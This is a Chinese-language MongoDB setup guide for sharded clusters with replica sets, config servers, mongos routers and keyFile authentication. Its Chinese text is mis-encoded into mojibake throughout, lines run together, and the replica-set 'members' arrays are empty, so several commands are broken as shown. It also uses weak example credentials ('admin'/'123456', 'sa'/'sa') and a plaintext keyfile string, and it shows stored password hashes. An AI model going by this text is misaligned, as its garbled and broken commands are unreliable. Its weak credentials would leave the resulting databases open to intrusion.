#ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œï¼Œåˆ›å»ºæœåŠ¡å™¨è¿›ç¨‹#nohttpinterface=true # å…³é—­httpæ¥å£ï¼Œé»˜è®¤å…³é—­27018ç«¯å£è®¿é—® port + 1000rest = true #httpæ¥å£ å¯åŠ¨rest ä½¿èƒ½è®¿é—® ã€‚ä¸nohttpinterface å¯¹åº” åªå¼€ä¸€ä¸ªshardsvr=true #å¯åŠ¨åˆ†ç‰‡#oplogSize=100 #å¤åˆ¶æ—¥å¿—å¤§å° MBlogpath=/data/mongodb/shard2-1/log/shard2-1.log #æ—¥å¿—è¾“å‡ºæ–‡ä»¶è·¯å¾„logappend=true #æ—¥å¿—è¾“å‡ºæ–¹å¼dbpath=/data/mongodb/shard2-1/db #æ•°æ®åº“è·¯å¾„directoryperdb=true # è®¾ç½®æ¯ä¸ªæ•°æ®åº“å°†è¢«ä¿å­˜åœ¨ä¸€ä¸ªå•ç‹¬çš„ç›®å½•replSet=shard2 #è®¾ç½®å¯Œæœ¬é›†çš„åå­—ä¸ºshard2,replSetæ˜¯è®©æœåŠ¡å™¨çŸ¥é“åœ¨è¿™ä¸ª&quot;shard2&quot;å‰¯æœ¬é›†ä¸­è¿˜æœ‰åˆ«çš„æœºå™¨#auth=true # å¯ç”¨éªŒè¯mkdir -p /data/mongodb/shard2-1a/db/mkdir -p /data/mongodb/shard2-1a/log//data/mongodb/shard2-1a/config.confport=32002 #ç«¯å£å·fork=true #ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œï¼Œåˆ›å»ºæœåŠ¡å™¨è¿›ç¨‹#nohttpinterface=true # å…³é—­httpæ¥å£ï¼Œé»˜è®¤å…³é—­27018ç«¯å£è®¿é—® port + 1000rest = true #httpæ¥å£ å¯åŠ¨rest ä½¿èƒ½è®¿é—® ã€‚ä¸nohttpinterface å¯¹åº” åªå¼€ä¸€ä¸ªshardsvr=true #å¯åŠ¨åˆ†ç‰‡#oplogSize=100 #å¤åˆ¶æ—¥å¿—å¤§å° MBlogpath=/data/mongodb/shard2-1a/log/shard2-1a.log #æ—¥å¿—è¾“å‡ºæ–‡ä»¶è·¯å¾„logappend=true #æ—¥å¿—è¾“å‡ºæ–¹å¼dbpath=/data/mongodb/shard2-1a/db #æ•°æ®åº“è·¯å¾„directoryperdb=true # è®¾ç½®æ¯ä¸ªæ•°æ®åº“å°†è¢«ä¿å­˜åœ¨ä¸€ä¸ªå•ç‹¬çš„ç›®å½•replSet=shard2 #è®¾ç½®å¯Œæœ¬é›†çš„åå­—ä¸ºshard2,replSetæ˜¯è®©æœåŠ¡å™¨çŸ¥é“åœ¨è¿™ä¸ª&quot;shard2&quot;å‰¯æœ¬é›†ä¸­è¿˜æœ‰åˆ«çš„æœºå™¨#auth=true # å¯ç”¨éªŒè¯mkdir -p /data/mongodb/shard2-2/db/mkdir -p /data/mongodb/shard2-2/log//data/mongodb/shard2-2/config.confport=32003 #ç«¯å£å·fork=true #ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œï¼Œåˆ›å»ºæœåŠ¡å™¨è¿›ç¨‹#nohttpinterface=true # å…³é—­httpæ¥å£ï¼Œé»˜è®¤å…³é—­27018ç«¯å£è®¿é—® port + 1000rest = true #httpæ¥å£ å¯åŠ¨rest ä½¿èƒ½è®¿é—® ã€‚ä¸nohttpinterface å¯¹åº” åªå¼€ä¸€ä¸ªshardsvr=true #å¯åŠ¨åˆ†ç‰‡#oplogSize=100 #å¤åˆ¶æ—¥å¿—å¤§å° MBlogpath=/data/mongodb/shard2-2/log/shard2-2.log #æ—¥å¿—è¾“å‡ºæ–‡ä»¶è·¯å¾„logappend=true #æ—¥å¿—è¾“å‡ºæ–¹å¼dbpath=/data/mongodb/shard2-2/db #æ•°æ®åº“è·¯å¾„directoryperdb=true # è®¾ç½®æ¯ä¸ªæ•°æ®åº“å°†è¢«ä¿å­˜åœ¨ä¸€ä¸ªå•ç‹¬çš„ç›®å½•replSet=shard2 #è®¾ç½®å¯Œæœ¬é›†çš„åå­—ä¸ºshard2,replSetæ˜¯è®©æœåŠ¡å™¨çŸ¥é“åœ¨è¿™ä¸ª&quot;shard2&quot;å‰¯æœ¬é›†ä¸­è¿˜æœ‰åˆ«çš„æœºå™¨#auth=true # å¯ç”¨éªŒè¯mkdir -p /data/mongodb/config1/db/mkdir -p /data/mongodb/config1/log//data/mongodb/config1/config.confdbpath = /data/mongodb/config1/dbconfigsvr = trueport = 40001logpath =/data/mongodb/config1/log/config1.loglogappend = truefork = true#auth=true # å¯ç”¨éªŒè¯mkdir -p /data/mongodb/config2/db/mkdir -p /data/mongodb/config2/log//data/mongodb/config2/config.confdbpath = /data/mongodb/config2/dbconfigsvr = trueport = 40002logpath =/data/mongodb/config2/log/config2.loglogappend = truefork = true#auth=true # å¯ç”¨éªŒè¯mkdir -p /data/mongodb/config3/db/mkdir -p /data/mongodb/config3/log//data/mongodb/config3/config.confdbpath = /data/mongodb/config3/dbconfigsvr = trueport = 40003logpath =/data/mongodb/config3/log/config3.loglogappend = truefork = true#auth=true # å¯ç”¨éªŒè¯mkdir -p /data/mongodb/mongos1/log//data/mongodb/mongos1/config.confconfigdb =10.10.113.122:40001,10.10.113.122:40002,10.10.113.122:40003port = 50001chunkSize = 1logpath =/data/mongodb/mongos1/log/mongos1.loglogappend = truefork = true#auth=true # å¯ç”¨éªŒè¯mkdir -p /data/mongodb/mongos2/log//data/mongodb/mongos2/config.confconfigdb =10.10.113.122:40001,10.10.113.122:40002,10.10.113.122:40003port = 50002chunkSize = 1logpath =/data/mongodb/mongos2/log/mongos2.loglogappend = truefork = true#auth=true # å¯ç”¨éªŒè¯äºŒ å¯åŠ¨shard1 å‰¯æœ¬ å¯åŠ¨/usr/local/mongodb/bin/mongod -f /data/mongodb/shard1-1/config.conf/usr/local/mongodb/bin/mongod -f /data/mongodb/shard1-1a/config.conf/usr/local/mongodb/bin/mongod -f /data/mongodb/shard1-2/config.conf/usr/local/mongodb/bin/mongo --port 30001use admindb.runCommand({â€œreplSetInitiateâ€:{&quot;_id&quot;:â€œshard1â€,â€œmembersâ€:}})shard2 å‰¯æœ¬ å¯åŠ¨/usr/local/mongodb/bin/mongod -f /data/mongodb/shard2-1/config.conf/usr/local/mongodb/bin/mongod -f /data/mongodb/shard2-1a/config.conf/usr/local/mongodb/bin/mongod -f /data/mongodb/shard2-2/config.conf/usr/local/mongodb/bin/mongo --port 31001use admindb.runCommand({â€œreplSetInitiateâ€:{&quot;_id&quot;:â€œshard2â€,â€œmembersâ€:}})config1 å¯åŠ¨/usr/local/mongodb/bin/mongod -f /data/mongodb/config1/config.confconfig2 å¯åŠ¨/usr/local/mongodb/bin/mongod -f /data/mongodb/config2/config.confconfig3 å¯åŠ¨/usr/local/mongodb/bin/mongod -f /data/mongodb/config3/config.confmongos1 å¯åŠ¨/usr/local/mongodb/bin/mongos -f /data/mongodb/mongos1/config.confmongos2 å¯åŠ¨/usr/local/mongodb/bin/mongos -f /data/mongodb/mongos2/config.conf/usr/local/mongodb/bin/mongo --port 50001use admindb.runCommand({addshard:â€œshard1/10.10.113.122:30001,10.10.113.122:30003â€,name:â€œshard1â€, maxsize:100})db.runCommand({addshard:â€œshard2/10.10.113.122:32001,10.10.113.122:32003â€,name:â€œshard2â€, maxsize:100})db.runCommand({listshards:1})use testdb.test.insert({â€œaaaâ€:â€œbbbâ€});ç¬¬ä¸‰èŠ‚ replica sets + shard ï¼ˆ3æœºé«˜å¯ç”¨ ï¼Œ ä¸€ä¸»åŒå¤‡ä»½ï¼‰ä¸€ æ–¹æ¡ˆæ¯ä¸ªåˆ†ç‰‡3æœåŠ¡å™¨ï¼Œå‰æœŸé‡‡ç”¨ä¸‰å°ï¼Œæ—¥åæœåŠ¡å™¨çš„å¢åŠ è€ƒè™‘ç¾å¤‡ï¼ŒæœåŠ¡å¢åŠ çš„åŸºæ•°æœ€å°‘ä¸ºä¸‰å°ï¼ˆæˆ–æ‰æœ‰åŒæœºæ–¹æ¡ˆï¼‰ã€‚Server1 10.10.113.122 Server1 10.10.113.132 Server3 10.10.113.133ç±»å‹ æœåŠ¡å™¨ ç”¨é€” ç³»ç»Ÿ è¯´æ˜å­˜å‚¨/æ•°æ® Server1 Shard1/Shard2/Shard3 Linux 64ä½ Shard1:10001;Shard2:10002,Shard3:10003;Server2 Shard1/Shard2/Shard3 Linux 64ä½ Shard1:10001;Shard2:10002,Shard3:10003;Server3 Shard1/Shard2/Shard3 Linux 64ä½ Shard1:10001;Shard2:10002,Shard3:10003;é…ç½® Server1 Config1 Linux 64ä½ Config1:20000;Server2 Config2 Linux 64ä½ Config2:20000;Server3 Config3 Linux 64ä½ Config3:20000;è·¯ç”± Server1 Mongos1 Linux 64ä½ Mongos:30000;Server2 Mongos2 Linux 64ä½ Mongos:30000;Server3 Mongos3 Linux 64ä½ Mongos:30000;äºŒ å‡†å¤‡å®‰è£…mongodb å‚ç…§ç¬¬ä¸€èŠ‚linux ä¼ æ–‡ä»¶ scp mongodb-linux-x86_64-2.0.4.tgz root@10.10.113.132:/root ssh 10.10.113.132åˆ é™¤ç›®å½• rm -r -f /data/mongodbåˆ›å»ºé…ç½®ã€æ—¥å¿—ã€åˆ†ç‰‡ã€keyæ–‡ä»¶å­˜å‚¨ç›®å½•åŠéªŒè¯æ–‡ä»¶mkdir /data/mongodb/configsvr/ -pmkdir /data/mongodb/log/ -pmkdir /data/mongodb/shard1/ -pmkdir /data/mongodb/shard2/ -pmkdir /data/mongodb/shard3/ -pmkdir /data/mongodb/key/ -pmkdir /data/mongodb/conf/security/ -pmkdir /data/mongodb/conf/nosecurity/ -påˆ›å»ºé…ç½®æ–‡ä»¶1ã€ åˆ›å»ºéªŒè¯æ–‡ä»¶securityäº/data/mongodb/key/ç›®å½•ï¼Œå…³èµ‹äºˆå¯è¯»æƒé™ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼šcd /data/mongodb/key/echo â€˜hycloudmongodbkeyâ€™ &gt; securitychmod 600 security2ã€ åˆ›å»ºshard1.confã€shard2.confã€shard3.confã€configsvr.confã€mongos.confäº/data/mongodb/conf/security/ å’Œ /data/mongodb/conf/nosecurity/çš„ç›®å½•ï¼Œå†…å®¹åˆ†åˆ«å¦‚ä¸‹ï¼šshard1.confdbpath = /data/mongodb/shard1directoryperdb = trueshardsvr = truereplSet = shard1#bind_ip = 10.10.113.122,localhostport = 10001oplogSize = 100logpath =/data/mongodb/log/shard1.loglogappend = trueprofile = 1slowms = 5rest = truefork = truekeyFile = /data/mongodb/key/security #nosecurityç›®å½•å°†è¯¥è¡Œåˆ é™¤shard2.confdbpath = /data/mongodb/shard2directoryperdb = trueshardsvr = truereplSet = shard2#bind_ip = 10.10.113.122,localhostport = 10002oplogSize = 100logpath = /data/mongodb/log/shard2.loglogappend = trueprofile = 1slowms = 5rest = truefork = truekeyFile = /data/mongodb/key/security #nosecurityç›®å½•å°†è¯¥è¡Œåˆ é™¤shard3.confdbpath = /data/mongodb/shard3directoryperdb = trueshardsvr = truereplSet = shard3#bind_ip = 10.10.113.122,localhostport = 10003oplogSize = 100logpath = /data/mongodb/log/shard3.loglogappend = trueprofile = 1slowms = 5rest = truefork = truekeyFile = /data/mongodb/key/security #nosecurityç›®å½•å°†è¯¥è¡Œåˆ é™¤configsvr.confdbpath = /data/mongodb/configsvrdirectoryperdb = trueconfigsvr = trueport = 20000logpath =/data/mongodb/log/configsvr.loglogappend = truefork = truekeyFile = /data/mongodb/key/security #nosecurityç›®å½•å°†è¯¥è¡Œåˆ é™¤mongos.confconfigdb =10.10.113.122:20000, 10.10.113.132:20000, 10.10.113.133:20000port = 30000chunkSize = 1 #å•ä½ mb ç”Ÿæˆç¯å¢ƒè¯·ä½¿ç”¨ 200 æˆ–åˆ é™¤logpath =/data/mongodb/log/mongos.loglogappend = truefork = truekeyFile = /data/mongodb/key/security #nosecurityç›®å½•å°†è¯¥è¡Œåˆ é™¤åˆ†ç‰‡é…ç½®è¯´æ˜ï¼šåˆ†ç‰‡è¦åœ¨æ— éªŒè¯ç¯å¢ƒä¸­é…ç½®ï¼Œå¦åˆ™ä¼šå‡ºç°æ— æƒé™ç­‰å¼‚å¸¸ã€‚é‡‡ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨Server1\\Server2\\Server3ä¸Šçš„shard1\\shard2\\shard3ï¼š /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/nosecurity/shard1.conf /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/nosecurity/shard2.conf /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/nosecurity/shard3.confä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹æ˜¯å¦æ­£å¸¸å¯åŠ¨ï¼š netstat -lnpt # æˆ– ps -ef | grep mongoå¯åŠ¨åè¿æ¥åˆ°shard1\\shard2\\shard3åˆ†åˆ«è¿›è¡Œé…ç½®ï¼Œåœ¨ä»»æ„ä¸€å°æœåŠ¡å™¨å³å¯ï¼Œä»¥ä¸‹æ˜¯å…·ä½“é…ç½®è¿‡ç¨‹ï¼š /usr/local/mongodb/bin/mongo --port 10001use adminconfig = {_id:â€œshard1â€, members: }; rs.initiate(config)exit /usr/local/mongodb/bin/mongo --port 10002use adminconfig = {_id:â€œshard2â€, members: }; rs.initiate(config)exit /usr/local/mongodb/bin/mongo --port 10003use adminconfig = {_id:â€œshard3â€, members: }; rs.initiate(config)è‡³æ­¤ï¼Œå·²å®Œæˆåˆ†ç‰‡é…ç½®è·¯ç”±è®¾ç½®è·¯ç”±æ˜¯èƒ½è¿‡configæ¥è¿æ¥åˆ†ç‰‡æœåŠ¡å™¨ï¼Œåœ¨å¯åŠ¨è·¯ç”±è¿›ç¨‹æ—¶ï¼Œå…ˆå¯åŠ¨é…ç½®è¿›ç¨‹ï¼Œè·¯ç”±é…ç½®è¿‡ç¨‹å¦‚ä¸‹ï¼š /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/nosecurity/configsvr.conf /usr/local/mongodb/bin/mongos -f /data/mongodb/conf/nosecurity/mongos.confå¯åŠ¨åï¼Œè¿æ¥è·¯ç”±è¿›è¡Œåˆ†ç‰‡æ·»åŠ ï¼Œåªéœ€é…ç½®ä¸€å°è·¯ç”±ã€‚æ³¨ï¼šåˆ†ç‰‡æ“ä½œéœ€åœ¨adminåº“ä¸‹è¿›è¡Œï¼Œå¦å¤–å¿…éœ€åœ¨æ— éªŒè¯è¦æ±‚ä¸‹è¿›è¡Œï¼Œå³é‡‡ç”¨å‰é¢åˆ›å»ºäºnosecurityæ–‡ä»¶å¤¹ä¸‹çš„é…ç½®ã€‚ /usr/local/mongodb/bin/mongo --port 30000mongos&gt; use adminmongos&gt; db.runCommand({addshard:â€œshard1/10.10.113.122:10001,10.10.113.132:10001,10.10.113.133:10001â€,name:â€œshard1â€, maxsize:20480} )mongos&gt; db.runCommand({addshard:â€œshard2/10.10.113.122:10002,10.10.113.132:10002,10.10.113.133:10002â€,name:â€œshard2â€, maxsize:20480} )mongos&gt; db.runCommand({addshard:â€œshard3/10.10.113.122:10003,10.10.113.132:10003,10.10.113.133:10003â€,name:â€œshard3â€, maxsize:20480} )å‘½ä»¤æ£€æŸ¥åˆ†ç‰‡æ·»åŠ æƒ…å†µï¼Œå¦‚å‡ºç°ä»¥ä¸‹ç»“æœåˆ™è¡¨ç¤ºé…ç½®æˆåŠŸï¼šmongos&gt; db.runCommand( {listshards : 1 } )æƒé™æ§åˆ¶MongoDBé»˜è®¤ä¸ºéªŒè¯æ¨¡å¼ã€‚å¦‚éœ€å¯¹æ•°æ®åº“è¿›è¡Œæƒé™æ§åˆ¶ï¼Œéœ€å…ˆé‡‡ç”¨æ— éªŒè¯æ¨¡å¼ç™»å½•ï¼Œè¿›å…¥adminåº“åˆ›å»ºç®¡ç†å‘˜ç”¨æˆ·åï¼Œå†é‡‡ç”¨éªŒè¯æ¨¡å¼ç™»å½•ã€‚é€šè¿‡å‰é¢åˆ›å»ºçš„ç®¡ç†å‘˜å¸å·è¿›è¡Œæ•°æ®åº“ä¸ç”¨æˆ·çš„åˆ›å»ºã€‚MongoDBé›†ç¾¤çš„æƒé™ä¸å•å°çš„æƒé™æ§åˆ¶çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œå•å°æ˜¯é€šè¿‡-authå±æ€§ï¼Œé›†ç¾¤æ˜¯é€šè¿‡keyFileæ¥è¿›è¡ŒæœåŠ¡å™¨é—´çš„éªŒè¯ã€‚ä»¥ä¸‹ä»‹ç»é…ç½®å…¨è¿‡ç¨‹ã€‚å‰é¢çš„æ‰€æœ‰æ­¥éª¤ï¼Œéƒ½æ˜¯åœ¨nosecurityæ¨¡å¼ä¸‹è¿›è¡Œã€‚å¦‚æœæ²¡æœ‰é‡‡ç”¨ééªŒè¯æ¨¡å¼çš„éœ€è¦å°†æ‰€æœ‰è¿›ç¨‹ï¼ˆåˆ†ç‰‡ã€é…ç½®ã€mongosï¼‰åœæ­¢ï¼Œå°†åˆ‡æ¢åˆ°æ— éªŒè¯æ¨¡å¼ã€‚æ­¥éª¤ä¸€ï¼šå…ˆè¿›è¡Œç™»å½•ï¼Œå¹¶åˆ‡æ¢è¿›adminåº“åˆ›å»ºç®¡ç†å‘˜å¸å· /usr/local/mongodb/bin/mongo --port 30000mongos&gt;use adminmongos&gt;db.addUser(â€˜adminâ€™,â€˜123456â€™){ &quot;singleShard&quot; :&quot;192.168.2.88:20000,192.168.2.89:20000,192.168.2.90:20000&quot;, &quot;n&quot; : 0, &quot;connectionId&quot; : 211, &quot;err&quot; : null, &quot;ok&quot; : 1 }{ &quot;_id&quot; :ObjectId(&quot;4f6c78ddad912a3ac6833ece&quot;), &quot;user&quot; : &quot;admin&quot;, &quot;readOnly&quot; : false, &quot;pwd&quot; :&quot;95ec4261124ba5951720b199908d892b&quot; }éªŒè¯ç”¨æˆ·åä¸å¯†ç mongos&gt; db.auth(â€˜adminâ€™,â€˜123456â€™)1mongos&gt;exitæ­¥éª¤äºŒï¼šé€€å‡ºåï¼Œå°†Server1\\Server2\\Server3æœåŠ¡å™¨ä¸ŠMongoDBçš„æ‰€æœ‰è¿›ç¨‹ï¼ˆåˆ†ç‰‡ã€é…ç½®ã€mongosï¼‰åœæ­¢ï¼Œå°†åˆ‡æ¢åˆ°éªŒè¯æ¨¡å¼ã€‚å…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š#killall mongod mongos#netstat -lnpt /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/security/shard1.conf /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/security/shard2.conf /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/security/shard3.conf netstat -lnpt /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/security/configsvr.conf /usr/local/mongodb/bin/mongos -f /data/mongodb/conf/security/mongos.confå¯åŠ¨åï¼Œå¦‚å¯¹åº“è¿›è¡ŒæŸ¥çœ‹ï¼Œåˆ™ä¼šæŠ¥ä»¥ä¸‹å¼‚å¸¸ï¼š /usr/local/mongodb/bin/mongo 10.10.113.122:30000/adminMongoDB shell version: 2.0.4connecting to:10.10.113.122:30000/adminshow dbsFri Mar 23 22:28:28 uncaughtexception: listDatabases failed:{ â€œokâ€ : 0, â€œerrmsgâ€ :â€œunauthorizedâ€ }ä»¥ä¸‹æ˜¯æ­£å¸¸ç™»å½•åæ˜¾ç¤ºçš„ä¿¡æ¯ï¼š /usr/local/mongodb/bin/mongo 10.10.113.122:30000/adminMongoDB shell version: 2.0.4connecting to:10.10.113.122:30000/admindb.auth(â€˜adminâ€™,â€˜123456â€™)1mongos&gt;æ­¥éª¤ä¸‰ï¼šä»¥ä¸‹æ˜¯æ•°æ®åº“åŠæ•°æ®åº“ç”¨æˆ·åˆ›å»ºçš„è¿‡ç¨‹ï¼šmongos&gt; use helloswitched to db hellomongos&gt;db.addUser(â€˜saâ€™,â€˜saâ€™){ &quot;singleShard&quot; :&quot;shard2/10.10.113.122:10002,10.10.113.132:10002,10.10.113.133:10002&quot;, &quot;n&quot; : 0, &quot;lastOp&quot; :NumberLong(&quot;5723101431532093441&quot;), &quot;connectionId&quot; : 38, &quot;err&quot; : null, &quot;ok&quot; : 1 }{ &quot;user&quot; : &quot;sa&quot;, &quot;readOnly&quot; : false, &quot;pwd&quot; :&quot;75692b1d11c072c6c79332e248c4f699&quot;, &quot;_id&quot; :ObjectId(&quot;4f6c8a6e9f67b049a20a00de&quot;) }mongos&gt; exitbye /usr/local/mongodb/bin/mongo 10.10.113.122:30000/hello -u sa -pMongoDB shell version: 2.0.4Enter password:connecting to:10.10.113.122:30000/helloshow collectionssystem.indexessystem.usersdb.system.users.find(){ â€œ_idâ€ :ObjectId(â€œ4f6c8a6e9f67b049a20a00deâ€), â€œuserâ€ :â€œsaâ€, â€œreadOnlyâ€ : false, â€œpwdâ€ :â€œ75692b1d11c072c6c79332e248c4f699â€ }åˆ†ç‰‡ /usr/local/mongodb/bin/mongo -port 30000use testå¯¼å…¥æ•°æ®use admindb.runCommand({â€œenableshardingâ€:â€œtestâ€})db.runCommand({â€œshardcollectionâ€:â€œtest.docâ€,â€œkeyâ€:{&quot;_id&quot;:1}})ç¬¬å››èŠ‚ replica sets + shard ï¼ˆ3æœºé«˜å¯ç”¨ ï¼Œ ä¸€ä¸»ä¸€å¤‡ä»½ä¸€ä»²è£ï¼‰ä¸€ æ–¹æ¡ˆæ¯ä¸ªåˆ†ç‰‡3æœåŠ¡å™¨ï¼Œå‰æœŸé‡‡ç”¨ä¸‰å°ï¼Œæ—¥åæœåŠ¡å™¨çš„å¢åŠ è€ƒè™‘ç¾å¤‡ï¼ŒæœåŠ¡å¢åŠ çš„åŸºæ•°æœ€å°‘ä¸ºä¸‰å°ï¼ˆæˆ–ç”¨æœ‰åŒæœºæ–¹æ¡ˆï¼‰ã€‚Server1 10.10.113.122 Server1 10.10.113.132 Server3 10.10.113.133ç±»å‹ æœåŠ¡å™¨ ç”¨é€” ç³»ç»Ÿ è¯´æ˜å­˜å‚¨/æ•°æ® Server1 Shard1/Shard2/Shard3 Linux 64ä½ Shard1:10001;Shard2:10002,Shard3:10003;Server2 Shard1/Shard2/Shard3 Linux 64ä½ Shard1:10001;Shard2:10002,Shard3:10003;Server3 Shard1/Shard2/Shard3 Linux 64ä½ Shard1:10001;Shard2:10002,Shard3:10003;é…ç½® Server1 Config1 Linux 64ä½ Config1:20000;Server2 Config2 Linux 64ä½ Config2:20000;Server3 Config3 Linux 64ä½ Config3:20000;è·¯ç”± Server1 Mongos1 Linux 64ä½ Mongos:30000;Server2 Mongos2 Linux 64ä½ Mongos:30000;Server3 Mongos3 Linux 64ä½ Mongos:30000;äºŒ å‡†å¤‡å®‰è£…mongodb å‚ç…§ç¬¬ä¸€èŠ‚linux ä¼ æ–‡ä»¶ scp mongodb-linux-x86_64-2.0.4.tgz root@10.10.113.132:/root ssh 10.10.113.132åˆ›å»ºé…ç½®ã€æ—¥å¿—ã€åˆ†ç‰‡ã€keyæ–‡ä»¶å­˜å‚¨ç›®å½•åŠéªŒè¯æ–‡ä»¶mkdir /data/mongodb/configsvr/ -pmkdir /data/mongodb/log/ -pmkdir /data/mongodb/shard1/ -pmkdir /data/mongodb/shard2/ -pmkdir /data/mongodb/shard3/ -pmkdir /data/mongodb/key/ -pmkdir /data/mongodb/conf/security/ -pmkdir /data/mongodb/conf/nosecurity/ -påˆ›å»ºé…ç½®æ–‡ä»¶1ã€ åˆ›å»ºéªŒè¯æ–‡ä»¶securityäº/data/mongodb/key/ç›®å½•ï¼Œå…³èµ‹äºˆå¯è¯»æƒé™ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼šcd /data/mongodb/key/echo â€˜hycloudmongodbkeyâ€™ &gt; securitychmod 600 /data/mongodb/key/security2ã€ åˆ›å»ºshard1.confã€shard2.confã€shard3.confã€configsvr.confã€mongos.confäº/data/mongodb/conf/security/ å’Œ /data/mongodb/conf/nosecurity/çš„ç›®å½•ï¼Œå†…å®¹åˆ†åˆ«å¦‚ä¸‹ï¼šshard1.confdbpath = /data/mongodb/shard1directoryperdb = trueshardsvr = truereplSet = shard1#bind_ip = 10.10.113.122,localhostport = 10001oplogSize = 100logpath =/data/mongodb/log/shard1.loglogappend = trueprofile = 1slowms = 5rest = truefork = truekeyFile = /data/mongodb/key/security #nosecurityç›®å½•å°†è¯¥è¡Œåˆ é™¤shard2.confdbpath = /data/mongodb/shard2directoryperdb = trueshardsvr = truereplSet = shard2#bind_ip = 10.10.113.122,localhostport = 10002oplogSize = 100logpath = /data/mongodb/log/shard2.loglogappend = trueprofile = 1slowms = 5rest = truefork = truekeyFile = /data/mongodb/key/security #nosecurityç›®å½•å°†è¯¥è¡Œåˆ é™¤shard3.confdbpath = /data/mongodb/shard3directoryperdb = trueshardsvr = truereplSet = shard3#bind_ip = 10.10.113.122,localhostport = 10003oplogSize = 100logpath = /data/mongodb/log/shard3.loglogappend = trueprofile = 1slowms = 5rest = truefork = truekeyFile = /data/mongodb/key/security #nosecurityç›®å½•å°†è¯¥è¡Œåˆ é™¤configsvr.confdbpath = /data/mongodb/configsvrdirectoryperdb = trueconfigsvr = trueport = 20000logpath =/data/mongodb/log/configsvr.loglogappend = truefork = truekeyFile = /data/mongodb/key/security #nosecurityç›®å½•å°†è¯¥è¡Œåˆ é™¤mongos.confconfigdb =10.10.113.122:20000, 10.10.113.132:20000, 10.10.113.133:20000port = 30000chunkSize = 1 #å•ä½ mb ç”Ÿæˆç¯å¢ƒè¯·ä½¿ç”¨ 200 æˆ–åˆ é™¤logpath =/data/mongodb/log/mongos.loglogappend = truefork = truekeyFile = /data/mongodb/key/security #nosecurityç›®å½•å°†è¯¥è¡Œåˆ é™¤åˆ†ç‰‡é…ç½®è¯´æ˜ï¼šåˆ†ç‰‡è¦åœ¨æ— éªŒè¯ç¯å¢ƒä¸­é…ç½®ï¼Œå¦åˆ™ä¼šå‡ºç°æ— æƒé™ç­‰å¼‚å¸¸ã€‚é‡‡ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨Server1\\Server2\\Server3ä¸Šçš„shard1\\shard2\\shard3ï¼š /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/nosecurity/shard1.conf /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/nosecurity/shard2.conf /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/nosecurity/shard3.confä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹æ˜¯å¦æ­£å¸¸å¯åŠ¨ï¼š netstat -lnpt # æˆ– ps -ef | grep mongoå¯åŠ¨åè¿æ¥åˆ°shard1\\shard2\\shard3åˆ†åˆ«è¿›è¡Œé…ç½®ï¼Œåœ¨ä»»æ„ä¸€å°æœåŠ¡å™¨å³å¯ï¼Œä»¥ä¸‹æ˜¯å…·ä½“é…ç½®è¿‡ç¨‹ï¼šï¼ˆæ³¨æ„ä¸èƒ½åœ¨ä»²è£æœºå™¨åˆå§‹åŒ–ï¼‰ /usr/local/mongodb/bin/mongo --port 10001use adminconfig = {_id:â€œshard1â€, members: }; rs.initiate(config)exit /usr/local/mongodb/bin/mongo --port 10002use adminconfig = {_id:â€œshard2â€, members: }; rs.initiate(config)exit /usr/local/mongodb/bin/mongo --port 10003use adminconfig = {_id:â€œshard3â€, members: }; rs.initiate(config)è‡³æ­¤ï¼Œå·²å®Œæˆåˆ†ç‰‡é…ç½®è·¯ç”±è®¾ç½®è·¯ç”±æ˜¯èƒ½è¿‡configæ¥è¿æ¥åˆ†ç‰‡æœåŠ¡å™¨ï¼Œåœ¨å¯åŠ¨è·¯ç”±è¿›ç¨‹æ—¶ï¼Œå…ˆå¯åŠ¨é…ç½®è¿›ç¨‹ï¼Œè·¯ç”±é…ç½®è¿‡ç¨‹å¦‚ä¸‹ï¼š /usr/local/mongodb/bin/mongod -f /data/mongodb/conf/nosecurity/configsvr.conf /usr/local/mongodb/bin/mongos -f /data/mongodb/conf/nosecurity/mongos.confå¯åŠ¨åï¼Œè¿æ¥è·¯ç”±è¿›è¡Œåˆ†ç‰‡æ·»åŠ ï¼Œåªéœ€é…ç½®ä¸€å°è·¯ç”±ã€‚æ³¨ï¼šåˆ†ç‰‡æ“ä½œéœ€åœ¨adminåº“ä¸‹è¿›è¡Œï¼Œå¦å¤–å¿…éœ€åœ¨æ— éªŒè¯è¦æ±‚ä¸‹è¿›è¡Œï¼Œå³é‡‡ç”¨å‰é¢åˆ›å»ºäºnosecurityæ–‡ä»¶å¤¹ä¸‹çš„é…ç½®ã€‚ /usr/local/mongodb/bin/mongo --port 30000mongos&gt; use admin maxsize:20480 #å•ä½ mb åˆ†ç‰‡é™åˆ¶å¤§å° æ ¹æ®å®é™…æœåŠ¡å™¨æ¥å®šmongos&gt; db.runCommand({addshard:â€œshard1/10.10.113.122:10001,10.10.113.132:10001,10.10.113.133:10001â€,name:â€œshard1â€, maxsize:20480} )mongos&gt; db.runCommand({addshard:â€œshard2/10.10.113.132:10002,10.10.113.133:10002,10.10.113.122:10002â€,name:â€œshard2â€, maxsize:20480} )mongos&gt; db.runCommand({addshard:â€œshard3/10.10.113.133:10003,10.10.113.122:10003,10.10.113.132:10003â€,name:â€œshard3â€, maxsize:20480} )å‘½ä»¤æ£€æŸ¥åˆ†ç‰‡æ·»åŠ æƒ…å†µï¼Œå¦‚å‡ºç°ä»¥ä¸‹ç»“æœåˆ™è¡¨ç¤ºé…ç½®æˆåŠŸï¼šmongos&gt; db.runCommand( {listshards : 1 } 